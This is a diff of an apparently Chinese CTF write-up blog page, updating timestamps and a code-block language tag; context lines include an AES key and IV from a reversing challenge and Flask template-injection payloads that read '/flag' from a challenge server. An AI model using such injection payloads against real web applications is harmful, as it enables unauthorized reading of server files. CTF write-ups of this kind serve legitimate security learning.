@@ -62,7 +62,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/10/23/26zReihgx1uCDaA.png">
 <meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-10-23-21-30-04.png">
 <meta property="article:published_time" content="2020-10-23T12:50:30.880Z">
-<meta property="article:modified_time" content="2020-11-18T01:47:37.361Z">
+<meta property="article:modified_time" content="2020-11-23T13:36:36.569Z">
 <meta property="article:author" content="Mr.Guo">
 <meta property="article:tag" content="RE">
 <meta name="twitter:card" content="summary">
@@ -365,7 +365,7 @@
 
 <p>对dump出的文件使用binwalk<br>分离出来png 还有 key 和 iv</p>
 <p>aes 加密</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">密文：jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</span><br><span class="line">key: Th1s_1s_K3y00000</span><br><span class="line">iv: 1234567890123456</span><br></pre></td></tr></tbody></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tbody><tr><td class="code"><pre><span class="line">密文：jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</span><br><span class="line">key: Th1s_1s_K3y00000</span><br><span class="line">iv: <span class="number">1234567890123456</span></span><br></pre></td></tr></tbody></table></figure></div>
 
 <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="FLASK"><a href="#FLASK" class="headerlink" title="FLASK"></a>FLASK</h4><p>模板注入</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">‘’[http://202.119.201.199:9001/name=%7B%7B().__class__.__bases__.__getitem__(0)%7D%7D](http://202.119.201.199:9001/name={{().__class__.__bases__.__getitem__(0)}})</span><br><span class="line"></span><br><span class="line">[http://202.119.201.199:9001/name=%7B%7B](http://202.119.201.199:9001/name={{)''‘’.class.mro.getitem(2).subclasses().pop(40)('/flag').read()%7D%7D</span><br></pre></td></tr></tbody></table></figure></div>
@@ -469,7 +469,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2020-11-18T01:47:37.361Z" itemprop="dateUpdated">2020-11-18 09:47:37</time>
+    Last updated: <time datetime="2020-11-23T13:36:36.569Z" itemprop="dateUpdated">2020-11-23 21:36:36</time>
 </span>
 
 
